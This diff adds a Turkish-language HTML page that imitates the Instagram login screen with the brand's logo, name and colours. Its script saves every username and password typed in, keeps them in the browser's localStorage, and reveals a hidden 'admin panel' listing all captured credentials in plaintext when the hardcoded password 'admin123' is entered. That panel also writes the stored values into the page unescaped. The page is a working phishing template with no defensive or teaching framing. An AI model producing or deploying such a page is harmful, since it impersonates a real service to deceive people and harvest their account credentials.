@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Giriş</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    /* Genel Ayarlar */
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: #262626;
+    }
+
+    /* Login Kutu */
+    .login-container {
+      background: white;
+      padding: 40px 40px 50px 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 40px rgba(203, 44, 115, 0.5);
+      width: 360px;
+      text-align: center;
+    }
+
+    /* Logo ve İsim */
+    .logo-container {
+      margin-bottom: 25px;
+    }
+    .logo {
+      width: 90px;
+      margin-bottom: 10px;
+      filter: drop-shadow(0 0 3px rgba(203, 44, 115, 0.7));
+    }
+    .site-name {
+      font-size: 36px;
+      font-weight: 700;
+      font-family: 'Billabong', cursive;
+      color: #262626;
+      letter-spacing: 2px;
+      user-select: none;
+      margin: 0;
+    }
+
+    /* Başlık */
+    h2 {
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #262626;
+    }
+
+    /* Inputlar */
+    .login-container input {
+      width: 100%;
+      padding: 14px 15px;
+      margin-bottom: 18px;
+      border: 1.5px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      outline-offset: 2px;
+      transition: border-color 0.3s ease;
+    }
+    .login-container input:focus {
+      border-color: #c13584;
+      box-shadow: 0 0 8px #c13584;
+    }
+
+    /* Buton */
+    .login-container button {
+      width: 100%;
+      padding: 14px 0;
+      background: #c13584;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      user-select: none;
+    }
+    .login-container button:hover {
+      background: #a6286c;
+    }
+
+    /* Mesaj */
+    #message {
+      margin-top: 20px;
+      font-weight: 600;
+      min-height: 24px;
+      user-select: none;
+    }
+
+    /* Admin Panel */
+    #admin-panel {
+      display: none;
+      margin-top: 30px;
+      width: 360px;
+      background: white;
+      padding: 25px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(203, 44, 115, 0.3);
+      text-align: left;
+      max-height: 300px;
+      overflow-y: auto;
+      font-size: 16px;
+      user-select: none;
+    }
+    #admin-panel h3 {
+      margin-top: 0;
+      margin-bottom: 15px;
+      font-weight: 700;
+      color: #c13584;
+    }
+    #logged-users-list {
+      list-style: none;
+      padding-left: 0;
+      margin: 0;
+    }
+    #logged-users-list li {
+      padding: 8px 10px;
+      border-bottom: 1px solid #eee;
+      color: #444;
+    }
+    #logged-users-list li:last-child {
+      border-bottom: none;
+    }
+  </style>
+
+  <!-- Instagram font benzeri için Billabong fontunu ekleyelim -->
+  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo-container">
+      <img
+        src="https://download.logo.wine/logo/Instagram/Instagram-Logo.wine.png"
+        alt="Instagram Logosu"
+        class="logo"
+      />
+      <h1 class="site-name">Instagram</h1>
+    </div>
+
+    <h2>Giriş Yap</h2>
+    <input type="text" id="username" placeholder="Kullanıcı Adı" autocomplete="off" />
+    <input type="text" id="password" placeholder="Şifre" autocomplete="off" />
+    <button onclick="login()">Giriş</button>
+    <p id="message"></p>
+  </div>
+
+  <div id="admin-panel">
+    <h3>Giriş Yapanlar (Admin Panel)</h3>
+    <ul id="logged-users-list"></ul>
+  </div>
+
+  <script>
+    const ADMIN_PASSWORD = "admin123"; // Buraya kendi admin şifreni yazabilirsin
+
+    let loggedInUsers = JSON.parse(localStorage.getItem('loggedInUsers')) || [];
+
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!username || !password) {
+        setMessage("Lütfen kullanıcı adı ve şifre girin.", "red");
+        return;
+      }
+
+      // Kullanıcıyı kaydet
+      loggedInUsers.push({ username, password });
+      localStorage.setItem('loggedInUsers', JSON.stringify(loggedInUsers));
+
+      if (password === ADMIN_PASSWORD) {
+        // Admin girişi ise paneli göster
+        showAdminPanel();
+        setMessage("Admin olarak giriş yapıldı.", "green");
+      } else {
+        // Normal kullanıcı girişi
+        hideAdminPanel();
+        setMessage("Devam ediliyor...", "green");
+      }
+
+      // Inputları temizle
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    }
+
+    function setMessage(text, color) {
+      const msg = document.getElementById("message");
+      msg.innerText = text;
+      msg.style.color = color;
+    }
+
+    function showAdminPanel() {
+      const panel = document.getElementById("admin-panel");
+      const list = document.getElementById("logged-users-list");
+
+      panel.style.display = "block";
+
+      let html = "";
+      loggedInUsers.forEach(user => {
+        html += `<li><b>${user.username}</b> - ${user.password}</li>`;
+      });
+
+      list.innerHTML = html;
+    }
+
+    function hideAdminPanel() {
+      const panel = document.getElementById("admin-panel");
+      panel.style.display = "none";
+    }
+
+    window.onload = () => {
+      hideAdminPanel();
+    };
+  </script>
+</body>
+</html>
